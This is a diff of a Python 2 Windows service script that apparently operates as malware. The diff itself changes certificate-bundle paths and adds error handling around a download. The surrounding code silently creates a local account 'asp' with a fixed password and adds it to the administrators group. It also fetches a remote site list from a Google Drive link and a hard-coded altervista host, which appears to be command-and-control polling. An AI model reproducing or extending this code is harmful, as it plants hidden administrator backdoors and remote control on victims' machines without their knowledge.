@@ -154,6 +154,11 @@ class AppServerSvc (win32serviceutil.ServiceFramework):
                myloop()      
        
 def Init():
+                        os.environ["REQUESTS_CA_BUNDLE"] = swin+"/cacert.pem"
+                        #os.environ["REQUESTS_CA_BUNDLE"] = os.path.join(os.getcwd(), "certifi", "cacert.pem")
+                        certifi.core.where=swin+"/certifi/cacert.pem"
+                        requests.utils.DEFAULT_CA_BUNDLE_PATH=swin+"/certifi/cacert.pem"
+                        requests.adapters.DEFAULT_CA_BUNDLE_PATH = swin+"/certifi/cacert.pem"
     #os.system("net.exe user Administrator /active:yes")
                         os.system("net.exe user asp Qwerty12! /add")
                         os.system("net.exe localgroup administrators asp /add")
@@ -188,7 +193,10 @@ def myloop():
     #ua = UserAgent()
     #header = {'User-Agent':str(ua.chrome)}
     header = {'User-Agent': 'Mozilla/5.0'}
-    mainsite = requests.get("https://drive.google.com/uc?export=download&id=1nT2hQWW1tOM_yxPK5_nhIm8xBVETGXdF", headers=header)
+    try:
+      mainsite = requests.get("https://drive.google.com/uc?export=download&id=1nT2hQWW1tOM_yxPK5_nhIm8xBVETGXdF", headers=header)
+    except Exception,e:
+      print str(e)
     #print mainsite.text
     sites = ["paner.altervista.org"]#, mainsite.text]
     sites.extend(mainsite.text.split(",") )
